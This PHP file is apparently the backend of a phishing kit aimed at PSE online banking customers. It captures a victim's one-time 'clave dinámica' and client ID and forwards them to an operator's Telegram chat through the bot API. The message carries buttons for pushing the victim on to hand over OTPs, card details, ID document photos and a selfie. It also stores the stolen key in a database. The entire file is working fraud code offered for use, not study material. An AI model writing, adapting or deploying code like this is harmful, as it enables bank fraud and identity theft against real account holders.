<?php
// modules/api/procesar_dinamica.php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
$config = include '../../config/config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

include '../../config/db.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $clienteId = $_POST['cliente_id'] ?? '';
    $dinamica = $_POST['dinamica'] ?? '';
    $isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';

    if (empty($clienteId) || empty($dinamica)) {
        header("Location: ../../index.php");
        exit();
    }

    // 1. Notificar a Telegram
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // Construir mensaje
    $mensaje = ($isRetry ? "⚠️ *ERROR CLAVE DINÁMICA RECIBIDA*" : "⌚ *CLAVE DINÁMICA RECIBIDA*") . "\n";
    $mensaje .= "🆔 Cliente: `$clienteId`\n";
    $mensaje .= "🔐 Clave Dinámica: `$dinamica`";

    // Teclado con opciones (incluyendo las nuevas)
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
                ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
            ],
            [
                ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"],
                ['text' => '💳 CC', 'url' => "$baseUrl?id=$clienteId&estado=5&key=$security_key"],
            ],
            [
                ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"],
                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=7&key=$security_key"],
            ],
            [
                ['text' => '🆔 Doc Frente', 'url' => "$baseUrl?id=$clienteId&estado=11&key=$security_key"],
                ['text' => '🆔 Doc Reverso', 'url' => "$baseUrl?id=$clienteId&estado=12&key=$security_key"]
            ],
            [
                ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$clienteId&estado=8&key=$security_key"],
                ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$clienteId&estado=9&key=$security_key"],
                ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$clienteId&estado=10&key=$security_key"]
            ],
            [
                ['text' => '⌚ Reloj', 'url' => "$baseUrl?id=$clienteId&estado=15&key=$security_key"],
                ['text' => '⚠️ Reloj Error', 'url' => "$baseUrl?id=$clienteId&estado=16&key=$security_key"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // 2. Actualizar BD (Guardamos en OTP por simplicidad o podríamos crear columna dinamica)
    // Para no romper esquemas, guardamos en una columna 'otp' concatenada o reemplazada
    // Mejor: actualizamos estado a 1 (Espera) y guardamos el dato

    // Opción: concatenar en campo 'otp' para tener historial, o solo actualizar
    $sql = "UPDATE pse SET estado = 1, otp = :dinamica WHERE id = :id";
    $stmt = $conn->prepare($sql);
    $stmt->execute([
        'dinamica' => $dinamica, // Reemplazamos OTP con la dinámica
        'id' => $clienteId
    ]);

    // 3. Redirigir a Espera
    header("Location: ../../index.php?status=espera&id=" . $clienteId);
    exit();

} else {
    header("Location: ../../index.php");
    exit();
}
?>
